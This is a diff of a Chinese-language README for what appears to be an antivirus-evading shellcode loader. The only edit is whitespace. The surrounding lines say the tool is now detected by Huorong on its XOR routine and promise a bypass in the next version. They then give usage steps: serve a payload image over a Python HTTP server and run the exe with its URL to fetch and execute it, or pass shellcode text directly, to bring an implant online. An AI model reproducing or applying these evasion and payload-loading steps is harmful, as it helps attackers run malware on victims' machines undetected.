@@ -22,12 +22,12 @@
 (目前这个测试已经不过火绒了，查杀点为"异或"，下个版本更新绕过异或查杀。)
 - 用python起一个HTTP服务(python -m http.server 8080)，
 - 把图片放到起http服务的目录下，
-- 执行exe 参数为http服务的图片路径（xxx.exe http://127.0.0.1:8080/a.jpg)。
+- 执行exe 参数为http服务的图片路径（xxx.exe http://127.0.0.1:8080/a.jpg) 。
 ### 4. 分离2
 #### 上线方式1
 - 用python起一个HTTP服务(python -m http.server 8080)，
 - 把图片放到起http服务的目录下，
-- 执行exe 参数为http服务的图片路径（xxx.exe http://127.0.0.1:8080/a.jpg)。
+- 执行exe 参数为http服务的图片路径（xxx.exe http://127.0.0.1:8080/a.jpg) 。
 #### 上线方式2
 - 执行xxx.exe 参数为shellcode.txt里的内容 。
 ### 5. 捆绑上线
